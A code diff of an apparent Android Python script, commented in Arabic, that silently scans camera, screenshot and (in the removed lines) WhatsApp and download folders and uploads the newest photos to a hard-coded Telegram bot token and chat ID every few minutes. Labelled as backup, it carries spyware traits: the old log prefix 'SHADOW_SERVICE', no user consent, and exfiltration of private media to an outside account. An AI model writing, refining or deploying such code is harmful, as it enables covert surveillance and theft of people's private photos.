@@ -1,84 +1,63 @@
 import os
 import time
 import requests
-import threading
 
-# بيانات الربط
+# بياناتك الخاصة
 BOT_TOKEN = "7820129712:AAH9pZ49S_m8tY8965625902"
 CHAT_ID = "6110903337"
 
-# المجلدات المستهدفة (المناطق المسموح بالوصول إليها عادةً)
-FOLDERS_TO_SYNC = [
+# المجلدات التي سيفحصها التطبيق
+WATCH_FOLDERS = [
     "/storage/emulated/0/DCIM/Camera",
     "/storage/emulated/0/Pictures/Screenshots",
-    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
-    "/storage/emulated/0/Download"
+    "/storage/emulated/0/MyBackup" # المجلد الذي اقترحه الـ AI
 ]
 
-sent_files = set()
+sent = set()
+IMAGE_EXT = (".jpg", ".jpeg", ".png")
 
-def log(msg):
-    print(f"[SHADOW_SERVICE] {msg}")
-
-def send_message(text):
+def send_file(path):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
     try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=20)
-    except: pass
-
-def send_photo(path):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-    try:
-        if not os.path.exists(path): return False
-        
         with open(path, "rb") as f:
             r = requests.post(
                 url,
-                files={"photo": f},
-                data={"chat_id": CHAT_ID, "caption": "📸 New Backup"},
+                data={"chat_id": CHAT_ID, "caption": f"✅ Backup: {os.path.basename(path)}"},
+                files={"document": f},
                 timeout=60
             )
         return r.status_code == 200
     except Exception as e:
-        log(f"SEND_ERROR: {e}")
+        print(f"ERROR_SENDING: {e}")
         return False
 
-def scan_and_send():
-    log("Scanning folders...")
-    for folder in FOLDERS_TO_SYNC:
+def scan():
+    for folder in WATCH_FOLDERS:
         if not os.path.exists(folder):
-            continue
+            try: os.makedirs(folder)
+            except: continue
 
         try:
-            # جلب كل الصور وترتيبها (الأحدث أولاً)
-            files = [
-                os.path.join(folder, f)
-                for f in os.listdir(folder)
-                if f.lower().endswith((".jpg", ".jpeg", ".png"))
-            ]
+            files = [os.path.join(folder, f) for f in os.listdir(folder) if f.lower().endswith(IMAGE_EXT)]
+            # ترتيب الأحدث أولاً
             files.sort(key=os.path.getmtime, reverse=True)
 
-            for img in files[:30]: # سحب آخر 30 صورة من كل مجلد
-                if img in sent_files:
-                    continue
-
-                if send_photo(img):
-                    sent_files.add(img)
-                    log(f"Successfully sent: {img}")
-                    time.sleep(6) # تأخير لمنع حظر البوت
-                else:
-                    time.sleep(2)
-        except Exception as e:
-            log(f"SCAN_FOLDER_ERROR: {e}")
+            for path in files[:10]: # فحص أول 10 صور من كل مجلد لضمان الاستقرار
+                if path not in sent:
+                    if send_file(path):
+                        sent.add(path)
+                        time.sleep(5) # تأخير لمنع الحظر
+        except:
+            continue
 
 def main():
-    log("SERVICE INITIATED")
-    send_message("✅ تم تفعيل نظام المزامنة الشامل للمجلدات المحددة.")
-    
+    # إرسال تنبيه عند بدء التشغيل
+    try: requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": "🚀 الخدمة الانتقائية تعمل الآن..."})
+    except: pass
+
     while True:
-        scan_and_send()
-        # فحص الجهاز كل 5 دقائق للبحث عن صور جديدة
-        time.sleep(300)
+        scan()
+        time.sleep(180) # فحص كل 3 دقائق
 
 if __name__ == "__main__":
     main()
